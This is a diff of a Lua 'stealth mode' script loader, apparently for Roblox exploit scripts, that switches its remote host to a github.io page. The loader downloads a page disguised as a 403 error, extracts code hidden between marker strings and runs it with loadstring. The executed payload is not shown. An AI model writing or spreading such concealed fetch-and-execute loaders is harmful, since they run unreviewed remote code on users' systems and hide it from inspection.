@@ -1,14 +1,21 @@
 -- ZHuB Loader v3.0
 -- Universal Script Entry Point (Stealth Mode)
 
-local url = "https://cacd794576a9a3.lhr.life/api/index.html"
+local url = "https://emrejurod-png.github.io/ZHuB/api/index.html"
 local success, result = pcall(function()
     return game:HttpGet(url)
 end)
 
 if success and result then
     -- Extract the hidden script from the 403 Unauthorized HTML page
-    local scriptContent = result:match("%[ZHUB_DATA_START%](.-)%[ZHUB_DATA_END%]")
+    local s, e = result:find("%[ZHUB_DATA_START%]")
+    local s2, e2 = result:find("%[ZHUB_DATA_END%]")
+    local scriptContent = nil
+    
+    if s and e and s2 then
+        scriptContent = result:sub(e + 1, s2 - 1)
+    end
+    
     if scriptContent then
         local func, err = loadstring(scriptContent)
         if func then
